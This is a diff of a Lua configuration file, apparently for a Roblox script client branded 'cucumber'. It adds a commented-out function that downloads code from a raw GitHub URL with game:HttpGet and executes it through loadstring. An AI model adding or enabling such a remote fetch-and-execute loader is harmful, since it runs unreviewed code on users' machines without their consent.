@@ -4,6 +4,26 @@
 {"animate_brand":true,"jump_ring_image":"rbxassetid://92880046539048","bullet_texture":"rbxassetid://92880046539048","always_apply_jump_rings":true,"branding_image":"rbxassetid://92880046539048","always_apply_bullets":true,"version":1,"always_apply_branding_image":true,"animate_user":true,"user_text":"cucumber","brand_text":"cucumber","animation_interval_ms":100}
 
 ]]
+--[[ cucumber auto lodet cfg
+local function loadstring_67(URL, dob)
+    local ok, scriptCode = pcall(function()
+        return game:HttpGet(URL)
+    end)
+    if not ok then
+        client.error("Failed to download AntiResolver: " .. tostring(scriptCode))
+        return
+    end
+
+    local fn, err = loadstring(scriptCode)
+    if fn then
+        fn(dob)
+    else
+        client.error("Failed to compile AntiResolver: " .. tostring(err))
+    end
+end
+
+loadstring_67("https://raw.githubusercontent.com/delivery-2347/open-source/refs/heads/main/lua%20vuvumber", 'YORE CFG')
+]]
 local cfg
 if (...) then
     cfg = (...)
